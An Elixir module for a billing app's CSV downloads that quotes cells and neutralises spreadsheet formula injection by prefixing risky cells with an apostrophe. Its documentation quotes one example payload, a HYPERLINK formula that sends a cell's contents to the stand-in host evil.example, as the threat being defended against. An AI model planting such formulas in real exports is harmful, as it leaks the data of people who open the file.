defmodule QuantumBillingWeb.CSV do
  @moduledoc """
  Writes CSV cells for the downloads.

  ## Formula injection

  Spreadsheets run a cell that starts with `=`, `+`, `-` or `@` as a formula. A
  client named `=HYPERLINK("http://evil.example/?"&A1,"Click")` would become a
  live link in the accountant's copy of the export, or worse, so such cells are
  prefixed with `'`, which spreadsheets read as "this is text". Plain numbers
  are left alone, so a negative amount still sums.
  """

  @doc "One CSV line, CRLF-terminated."
  def line(fields), do: Enum.map_join(fields, ",", &cell/1) <> "\r\n"

  @doc "One cell: neutralised against formulas, then quoted if it needs to be."
  def cell(field) when is_binary(field), do: field |> neutralize() |> quote_if_needed()

  defp neutralize(<<first, _rest::binary>> = field) when first in [?=, ?+, ?-, ?@, ?\t, ?\r] do
    if Regex.match?(~r/\A[+-]?\d+(\.\d+)?\z/, field), do: field, else: "'" <> field
  end

  defp neutralize(field), do: field

  defp quote_if_needed(field) do
    if String.contains?(field, [",", "\"", "\n", "\r"]) do
      ~s("#{String.replace(field, "\"", "\"\"")}")
    else
      field
    end
  end
end
